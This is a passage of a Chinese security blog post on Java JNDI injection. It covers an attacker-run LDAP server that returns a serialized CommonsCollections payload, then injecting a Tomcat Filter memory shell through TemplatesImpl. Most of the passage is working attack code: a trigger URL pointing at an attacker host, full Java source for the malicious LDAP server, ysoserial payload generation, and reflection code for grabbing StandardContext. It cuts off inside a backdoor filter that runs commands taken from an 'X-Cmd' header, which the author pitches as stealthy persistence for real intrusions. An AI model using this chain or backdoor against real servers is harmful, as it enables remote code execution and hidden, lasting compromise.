+<p>值得注意的是，远程类加载触发 和 反序列化链触发 的 URL 是一模一样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /vuln?url=ldap://攻击者IP:1389/exploit</span><br></pre></td></tr></table></figure>
+
+<p>区别在于攻击者 LDAP 服务返回的 Entry 内容不同，一个返回<code>javaFactory</code>，一个返回<code>javaSerializedData</code>，客户端自动走不同分支。</p>
+<p>因为需要利用反序列化，所以添加一个 CC3.1 的依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="搭建恶意LDAP服务"><a href="#搭建恶意LDAP服务" class="headerlink" title="搭建恶意LDAP服务"></a>搭建恶意LDAP服务</h3><p>这里自己写一个简单的 LDAP 服务（也可以用工具，这里写一下代码学习一下）。</p>
+<p>如果自己搭 LDAP 服务并想手动塞入 payload，需要先生成序列化数据。以 CC6 链为例，可以用 ysoserial 生成：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&quot;calc.exe&quot;</span> &gt; payload.ser</span><br><span class="line"><span class="comment"># 或者其他方法</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260423224846086.png"></p>
+<p>生成的<code>payload.ser</code>就是要塞进 LDAP Entry <code>javaSerializedData</code>属性里的字节数据。</p>
+<p>自己写 LDAP 服务可以基于<code>UnboundID LDAP SDK</code>，pom.xml 添加依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码大概是这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MaliciousLDAPServer</span> &#123;</span><br><span class="line">    <span class="comment">// idea 直接运行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从本地加载预先生成好的 CC6 反序列化 payload.ser</span></span><br><span class="line">        <span class="type">byte</span>[] payload = Files.readAllBytes(Paths.get(<span class="string">&quot;payload.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用 UnboundID 库在本地起一个轻量级 LDAP Server，监听 1389 端口</span></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(<span class="string">&quot;dc=example,dc=com&quot;</span>);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(<span class="string">&quot;listen&quot;</span>, <span class="literal">null</span>, <span class="number">1389</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">InMemoryOperationInterceptor</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 核心拦截器 — 构造恶意 Entry</span></span><br><span class="line">                    <span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(<span class="string">&quot;cn=exploit,dc=example,dc=com&quot;</span>);</span><br><span class="line">                    entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">                    <span class="comment">// 塞入序列化数据</span></span><br><span class="line">                    entry.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, payload);</span><br><span class="line">                    result.sendSearchEntry(entry);</span><br><span class="line">                    result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        ds.startListening();</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] LDAP Server started on port 1389&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="触发验证"><a href="#触发验证" class="headerlink" title="触发验证"></a>触发验证</h3><p>先启动 Tomcat 服务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121627611.png"></p>
+<p>然后启动自己写的 LDAP 服务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121727961.png"></p>
+<p>访问 LDAP 触发漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080//vuln?url=ldap://127.0.0.1:1389/exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424121539679.png"></p>
+<p>成功弹出计算器。</p>
+<p>再梳理一遍过程：服务器的漏洞点请求我们自己写的 LDAP 服务，返回的 Entry 里包含<code>javaSerializedData</code>数据，服务器找到这个之后就不会再去找远程的<code>javaCodeBase</code>和<code>javaFactory</code>了，直接反序列化<code>javaSerializedData</code>里的数据，也就是我们传入的 CC6 链的 payload.ser，由于这个 CC6 链是用工具生成，直接用了 calc 的命令。</p>
+<p>和之前的打法不同的是，这次不需要在远程服务器上放一个恶意类文件了，payload 完全在序列化字节里，更隐蔽。</p>
+<hr>
+<h2 id="联动内存马注入"><a href="#联动内存马注入" class="headerlink" title="联动内存马注入"></a>联动内存马注入</h2><p>弹计算器只是验证能打通，虽然已经可以利用反序列化 RCE 了，但实战里注入内存马可以实现更隐蔽的维权。思路是把 CC 链的执行命令部分替换成内存马注入代码。</p>
+<h3 id="攻击链设计思路"><a href="#攻击链设计思路" class="headerlink" title="攻击链设计思路"></a>攻击链设计思路</h3><p>前面内存马系列写了 Filter&#x2F;Servlet&#x2F;Listener 内存马的注入原理，核心都是要在运行时动态修改<code>StandardContext</code>往里塞组件。思路是把注入内存马的代码打包成字节码，让反序列化链来加载执行。</p>
+<p><strong>为什么走 TemplatesImpl？</strong> 因为 CC 链本身的终点可以是命令执行（Runtime.exec），也可以是加载任意字节码（通过 TemplatesImpl），后者能执行任意 Java 代码，注入内存马用这个更合适。这个方法上篇 CC3 文章是有讲到过的。</p>
+<p>整条攻击链长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JNDI lookup → LDAP Server 返回 javaSerializedData</span><br><span class="line">  → readObject() 触发反序列化</span><br><span class="line">    → CC3 链 → TemplatesImpl._bytecodes</span><br><span class="line">      → 加载 FilterInject.class（继承 AbstractTranslet）</span><br><span class="line">        → static 块执行 → 注入 Filter 内存马</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取StandardContext的几种方式"><a href="#获取StandardContext的几种方式" class="headerlink" title="获取StandardContext的几种方式"></a>获取StandardContext的几种方式</h3><p>注入内存马首先要拿到<code>StandardContext</code>，有好几种方式，这里都试了一下。</p>
+<h4 id="方式一：Thread-获取-StandardContext（常用）"><a href="#方式一：Thread-获取-StandardContext（常用）" class="headerlink" title="方式一：Thread 获取 StandardContext（常用）"></a>方式一：Thread 获取 StandardContext（常用）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前线程</span><br><span class="line">  └─ ContextClassLoader (ParallelWebappClassLoader)</span><br><span class="line">        └─ resources 字段 (StandardRoot)</span><br><span class="line">              └─ context 字段 (StandardContext)  ← 目标</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类加载器并强转</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line"><span class="comment">// 向上遍历父类，找到 resources 字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line"><span class="comment">// 从 StandardRoot 中反射取出 context</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工具方法：向上遍历父类找字段</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 clazz 本身没有这个字段，就去父类里找，一直找到 Object 为止</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; <span class="keyword">return</span> clazz.getDeclaredField(name); &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException e) &#123; clazz = clazz.getSuperclass(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">        <span class="comment">// 从 StandardRoot 里取 context 字段，正是 StandardContext</span></span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">sr</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> sr.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> f.get(sr);</span><br><span class="line">        <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="方式二：JMX-获取-StandardContext（兜底方案）"><a href="#方式二：JMX-获取-StandardContext（兜底方案）" class="headerlink" title="方式二：JMX 获取 StandardContext（兜底方案）"></a>方式二：JMX 获取 StandardContext（兜底方案）</h4><p>除了通过 Thread 获取 StandardContext 的方式，还有通过 JMX 获取的方式，在有些地方能看到叫 <code>fromJMX</code>。反正方法很多，我也测试了一下，JMX 那条路好像需要开启特定的启动参数才行，就不深入了。下面贴一个三种方式都试的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主入口：尝试多种方法获取 StandardContext</span></span><br><span class="line"><span class="keyword">private</span> StandardContext <span class="title function_">getStandardContext</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 方法1: JMX 标准查询</span></span><br><span class="line">    ctx = getContextByJMX();</span><br><span class="line">    <span class="keyword">if</span> (ctx != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&gt;&gt;&gt; Successfully obtained StandardContext via ** JMX **&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方法2: 从当前 ClassLoader 反射获取</span></span><br><span class="line">    ctx = getContextByClassLoader();</span><br><span class="line">    <span class="keyword">if</span> (ctx != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&gt;&gt;&gt; Successfully obtained StandardContext via ** ClassLoader reflection **&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方法3: 暴力遍历所有 MBean（兜底）</span></span><br><span class="line">    ctx = getContextByMBeanServerDirect();</span><br><span class="line">    <span class="keyword">if</span> (ctx != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&gt;&gt;&gt; Successfully obtained StandardContext via ** fallback MBean traversal **&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctx;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    System.err.println(<span class="string">&quot;&gt;&gt;&gt; All three methods failed to obtain StandardContext.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JMX 标准查询 (Tomcat 9)</span></span><br><span class="line"><span class="keyword">private</span> StandardContext <span class="title function_">getContextByJMX</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">MBeanServer</span> <span class="variable">mbs</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">    <span class="type">ObjectName</span> <span class="variable">query</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(<span class="string">&quot;Catalina:type=Context,*&quot;</span>);</span><br><span class="line">    Set&lt;ObjectName&gt; names = mbs.queryNames(query, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">for</span> (ObjectName name : names) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> (String) mbs.getAttribute(name, <span class="string">&quot;path&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (path == <span class="literal">null</span> || path.isEmpty()) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> mbs.invoke(name, <span class="string">&quot;findMappingObject&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[JMX] Found StandardContext with path: &quot;</span> + path);</span><br><span class="line">            <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;[JMX] No StandardContext found&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过当前线程 ClassLoader 反射 resources-&gt;context</span></span><br><span class="line"><span class="keyword">private</span> StandardContext <span class="title function_">getContextByClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">if</span> (!(cl <span class="keyword">instanceof</span> ParallelWebappClassLoader)) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ClassLoader] Not a ParallelWebappClassLoader: &quot;</span> + cl.getClass().getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">getResources</span> <span class="operator">=</span> pwcl.getClass().getMethod(<span class="string">&quot;getResources&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> getResources.invoke(pwcl);</span><br><span class="line">    <span class="keyword">if</span> (resources == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (resField != <span class="literal">null</span>) &#123;</span><br><span class="line">            resField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            resources = resField.get(pwcl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (resources == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ClassLoader] Cannot obtain resources object&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">ctxField</span> <span class="operator">=</span> getFieldFromHierarchy(resources.getClass(), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ctxField == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    ctxField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> ctxField.get(resources);</span><br><span class="line">    <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[ClassLoader] Found StandardContext: &quot;</span> + ((StandardContext) ctx).getPath());</span><br><span class="line">        <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴力遍历所有 MBean 属性（兜底）</span></span><br><span class="line"><span class="keyword">private</span> StandardContext <span class="title function_">getContextByMBeanServerDirect</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">MBeanServer</span> <span class="variable">mbs</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">    Set&lt;ObjectName&gt; all = mbs.queryNames(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">for</span> (ObjectName name : all) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (name.toString().contains(<span class="string">&quot;type=Context&quot;</span>) &amp;&amp; mbs.isInstanceOf(name, <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> mbs.invoke(name, <span class="string">&quot;findMappingObject&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">if</span> (instance <span class="keyword">instanceof</span> StandardContext) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[Direct] Found StandardContext: &quot;</span> + ((StandardContext) instance).getPath());</span><br><span class="line">                    <span class="keyword">return</span> (StandardContext) instance;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果是第二种方式（ClassLoader 反射）成功了，第一种 JMX 方式没成功，好像需要开启 JMX 的一个启动参数，不管了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260424222852131.png"></p>
+<p>测试结果没有问题，可以正常 RCE。</p>
+<p>反正大概的思路就是这样，区别就是代码写法和版本环境问题了。</p>
+<h3 id="CmdFilter内存马"><a href="#CmdFilter内存马" class="headerlink" title="CmdFilter内存马"></a>CmdFilter内存马</h3><p>以前的内存马都是非常简单的 URL 参数检测，这次换个方式玩玩——用请求头传命令，更隐蔽。</p>
+<p>因为 CC6 是不包含 TemplatesImpl 的使用的，换个链，搭建的环境用的是 CC3.1 版本依赖，所以这次选择 CC3 链测试，之前也写过刚好拿来用。</p>
+<p>首先先写一个 Filter：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求拦截逻辑</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) resp;</span><br><span class="line">        <span class="comment">// 从请求头读取命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X-Cmd&quot;</span>);</span><br><span class="line">        <span class="comment">// 